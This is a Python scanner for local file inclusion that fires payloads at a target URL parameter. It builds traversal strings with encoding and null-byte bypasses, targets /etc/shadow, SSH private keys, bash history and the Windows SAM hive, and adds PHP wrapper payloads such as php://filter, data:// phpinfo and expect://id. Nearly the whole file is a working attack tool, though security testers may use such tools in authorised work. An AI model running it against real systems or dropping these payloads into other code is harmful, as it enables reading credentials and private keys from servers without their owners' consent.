#!/usr/bin/env python3
"""
LFI/RFI Scanner
Local/Remote File Inclusion vulnerability scanner.

USAGE:
    python lfi_scanner.py <url> [-p param] [--os linux|windows] [--depth N]

EXAMPLES:
    python lfi_scanner.py "https://example.com/page?file=test"
    python lfi_scanner.py "https://example.com/page?file=test" -p file --os linux
    python lfi_scanner.py "https://example.com/page?file=test" --depth 10 --filter-bypass
"""

import sys
import argparse
import re
from urllib.parse import urlparse, parse_qs, urlencode
sys.path.insert(0, '/home/l0ve/Desktop/WD/Tools')
from lib import success, error, warning, info, banner, HTTPClient

# LFI Payloads
LFI_LINUX = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/issue',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/proc/self/fd/0',
    '/proc/version',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/nginx/error.log',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/home/*/.bash_history',
    '/root/.bash_history',
    '/home/*/.ssh/id_rsa',
    '/root/.ssh/id_rsa',
]

LFI_WINDOWS = [
    'C:\\Windows\\System32\\drivers\\etc\\hosts',
    'C:\\Windows\\System32\\config\\SAM',
    'C:\\Windows\\win.ini',
    'C:\\Windows\\system.ini',
    'C:\\boot.ini',
    'C:\\Windows\\debug\\NetSetup.log',
    'C:\\Windows\\Panther\\Unattend.xml',
    'C:\\Windows\\Panther\\Unattended.xml',
    'C:\\inetpub\\logs\\LogFiles',
    'C:\\inetpub\\wwwroot\\web.config',
]

# Traversal sequences
TRAVERSALS = [
    '../',
    '..\\',
    '..../',
    '....\\',
    '....//',
    '....\\\\',
    '%2e%2e%2f',
    '%2e%2e/',
    '..%2f',
    '%2e%2e%5c',
    '..%5c',
    '%252e%252e%252f',
    '..%c0%af',
    '..%c1%9c',
    '....//....//....//....//....//....//....//.....//',
]

# Filter bypass techniques
FILTER_BYPASS = [
    '',
    '%00',  # Null byte
    '%00.php',
    '%00.html',
    '?',
    '#',
    '/./',
    '/.',
]

# Content patterns for detection
DETECTION_PATTERNS = {
    'linux_passwd': r'root:.*:0:0:',
    'linux_shadow': r'root:\$[0-9a-z]+\$',
    'linux_hosts': r'127\.0\.0\.1\s+localhost',
    'windows_hosts': r'127\.0\.0\.1\s+localhost',
    'windows_ini': r'\[fonts\]|\[extensions\]',
    'php_source': r'<\?php',
    'proc_environ': r'PATH=|HOME=|USER=',
}


class LFIScanner:
    def __init__(self, proxy: str = None, timeout: int = 10):
        self.client = HTTPClient(proxy=proxy, timeout=timeout)
        self.vulnerabilities = []
        self.baseline_length = 0

    def get_baseline(self, url: str, param: str, method: str = 'GET') -> int:
        """Get baseline response length."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = ['nonexistent_file_xyz']
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
            resp = self.client.get(test_url)
            self.baseline_length = len(resp.text)
            return self.baseline_length
        except:
            return 0

    def detect_inclusion(self, content: str) -> list:
        """Detect file inclusion based on response content."""
        detected = []
        for name, pattern in DETECTION_PATTERNS.items():
            if re.search(pattern, content, re.IGNORECASE):
                detected.append(name)
        return detected

    def build_payloads(self, target_os: str = 'linux', depth: int = 7,
                       use_filter_bypass: bool = False) -> list:
        """Build LFI payloads."""
        payloads = []

        # Select target files
        target_files = LFI_LINUX if target_os == 'linux' else LFI_WINDOWS

        for file in target_files:
            # Direct file
            payloads.append(file)

            # With traversal sequences
            for traversal in TRAVERSALS:
                for d in range(1, depth + 1):
                    path = traversal * d + file.lstrip('/')
                    payloads.append(path)

            # Filter bypass
            if use_filter_bypass:
                for bypass in FILTER_BYPASS:
                    payloads.append(file + bypass)
                    for traversal in TRAVERSALS[:3]:
                        for d in range(1, min(depth, 5) + 1):
                            path = traversal * d + file.lstrip('/') + bypass
                            payloads.append(path)

        # PHP wrappers
        payloads.extend([
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://filter/read=string.rot13/resource=/etc/passwd',
            'php://input',
            'php://stdin',
            'data://text/plain,<?php phpinfo(); ?>',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
            'expect://id',
            'file:///etc/passwd',
        ])

        return list(set(payloads))

    def test_payload(self, url: str, param: str, payload: str, method: str = 'GET') -> dict:
        """Test a single LFI payload."""
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

            resp = self.client.get(test_url)

            # Check for inclusion indicators
            detections = self.detect_inclusion(resp.text)

            # Check for significant length difference
            len_diff = abs(len(resp.text) - self.baseline_length)

            if detections or len_diff > 100:
                return {
                    'vulnerable': True,
                    'payload': payload,
                    'detections': detections,
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'content_preview': resp.text[:500] if detections else None
                }

        except Exception as e:
            pass

        return {'vulnerable': False}

    def scan(self, url: str, params: list = None, target_os: str = 'linux',
             depth: int = 7, filter_bypass: bool = False) -> list:
        """Run LFI scan."""

        # Auto-detect parameters
        if not params:
            parsed = urlparse(url)
            params = list(parse_qs(parsed.query).keys())

        if not params:
            warning("No parameters to test")
            return []

        info(f"Target OS: {target_os}")
        info(f"Traversal depth: {depth}")

        payloads = self.build_payloads(target_os, depth, filter_bypass)
        info(f"Testing {len(payloads)} payloads...")

        for param in params:
            info(f"\nTesting parameter: {param}")

            # Get baseline
            self.get_baseline(url, param)

            for payload in payloads:
                result = self.test_payload(url, param, payload)

                if result['vulnerable']:
                    self.vulnerabilities.append({
                        'param': param,
                        'payload': payload,
                        'detections': result['detections'],
                        'status': result['status'],
                        'length': result['length']
                    })
                    success(f"[LFI] param={param} | payload={payload[:60]}... | detections={result['detections']}")

        return self.vulnerabilities


def main():
    parser = argparse.ArgumentParser(
        description='LFI/RFI Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
    %(prog)s "https://example.com/page?file=test"
    %(prog)s "https://example.com/page?file=test" -p file --os linux
    %(prog)s "https://example.com/page?file=test" --depth 10 --filter-bypass
        """
    )
    parser.add_argument('url', help='Target URL')
    parser.add_argument('-p', '--param', action='append', help='Parameter to test')
    parser.add_argument('--os', choices=['linux', 'windows'], default='linux', help='Target OS (default: linux)')
    parser.add_argument('--depth', type=int, default=7, help='Traversal depth (default: 7)')
    parser.add_argument('--filter-bypass', action='store_true', help='Include filter bypass payloads')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('-o', '--output', help='Output file')
    args = parser.parse_args()

    banner("LFI/RFI Scanner")
    info(f"Target: {args.url}")

    scanner = LFIScanner(proxy=args.proxy)
    results = scanner.scan(
        args.url,
        params=args.param,
        target_os=args.os,
        depth=args.depth,
        filter_bypass=args.filter_bypass
    )

    print()
    if results:
        success(f"Found {len(results)} potential LFI vulnerability(ies)")
    else:
        warning("No LFI vulnerabilities detected")

    if args.output:
        import json
        with open(args.output, 'w') as f:
            json.dump({'url': args.url, 'vulnerabilities': results}, f, indent=2)
        success(f"Results saved to {args.output}")


if __name__ == '__main__':
    main()
